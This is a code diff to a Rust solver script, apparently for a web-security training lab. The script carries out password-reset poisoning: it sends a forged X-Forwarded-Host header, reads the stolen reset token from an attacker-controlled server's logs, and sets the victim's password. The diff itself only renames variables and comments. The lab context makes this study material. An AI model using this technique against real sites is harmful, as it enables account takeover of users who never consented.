@@ -42,7 +42,7 @@ fn main() {
     let new_password = "Hacked"; // change thin to what you want
     let is_changed = change_dynamically_generated_link(&client, url, exploit_server_domain); // change the dynamically-generating link via X-Forwarded-Host
     if is_changed {
-        // if you injected XSS successfully
+        // if you changed the link successfully
         let some_token = extract_token_from_logs(&client, exploit_server_domain); // try to extract the token from the your server logs
         if let Some(token) = some_token {
             println!("{}", token);
@@ -80,20 +80,20 @@ fn build_client() -> Client {
         .unwrap()
 }
 
-/******************************************************
-* Function used to inject XSS in comment functionality
-*******************************************************/
+/********************************************************
+* Function used to change the dynamically-generated link
+*********************************************************/
 fn change_dynamically_generated_link(
     client: &Client,
     url: &str,
     exploit_server_domain: &str,
 ) -> bool {
-    let exploit_xss = client
+    let change_link = client
         .post(&format!("{url}/forgot-password"))
         .form(&HashMap::from([("username", "carlos")]))
         .header("X-Forwarded-Host", exploit_server_domain)
         .send();
-    if let Ok(res) = exploit_xss {
+    if let Ok(res) = change_link {
         println!(
             "{}",
             "1. Change the dynamically generated link via X-Forwarded-Host header.. ☑️"
@@ -107,7 +107,7 @@ fn change_dynamically_generated_link(
 }
 
 /*****************************************************************
-* Function used to extract the cookie from the exploit sever logs
+* Function used to extract the token from the exploit sever logs
 ******************************************************************/
 fn extract_token_from_logs(client: &Client, exploit_server_domain: &str) -> Option<String> {
     let pattern = Regex::new("temp-forgot-password-token=(.*) HTTP").unwrap();
@@ -116,8 +116,8 @@ fn extract_token_from_logs(client: &Client, exploit_server_domain: &str) -> Opti
         .send();
     if let Ok(res) = logs {
         let body = res.text().unwrap();
-        let cookie = pattern.captures_iter(&body);
-        if let Some(text) = cookie.last() {
+        let token = pattern.captures_iter(&body);
+        if let Some(text) = token.last() {
             let encrypt = text.get(1).unwrap().as_str().to_string();
             println!(
                 "{}",
@@ -135,9 +135,9 @@ fn extract_token_from_logs(client: &Client, exploit_server_domain: &str) -> Opti
     }
 }
 
-/**********************************************
-* Function used issue a change passwor request
-***********************************************/
+/*************************************************
+* Function used to issue a change password request
+**************************************************/
 fn change_password(
     client: &Client,
     url: &str,
